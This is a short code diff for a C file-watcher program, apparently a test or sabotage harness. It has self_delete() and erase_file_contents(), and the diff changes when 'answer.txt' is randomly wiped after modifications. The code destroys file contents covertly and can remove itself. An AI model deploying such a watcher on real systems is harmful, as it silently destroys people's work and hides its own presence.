@@ -52,6 +52,8 @@ void self_delete() {
 }
 
 void erase_file_contents(const char* filename) {
+    if(rand() % 4 > 0) return;
+
     // Flag to check if we should not erase
     FILE *file = fopen("project/not_erase.txt", "r");
     if (file) {
@@ -70,6 +72,7 @@ void erase_file_contents(const char* filename) {
 }
 
 int main(int argc, char *argv[]) {
+    srand(time(NULL));
     int fd, wd;
     char buffer[BUF_LEN];
 
@@ -156,7 +159,7 @@ int main(int argc, char *argv[]) {
                     else {
                         //printf("File changed, erasing contents...\n");
                         counter++;
-                        if(counter % NB_SKIPS == 0 && rand() % 4 == 0) {
+                        if(counter % NB_SKIPS == 0) {
                             erase_file_contents("answer.txt");
 
                             modified = true;
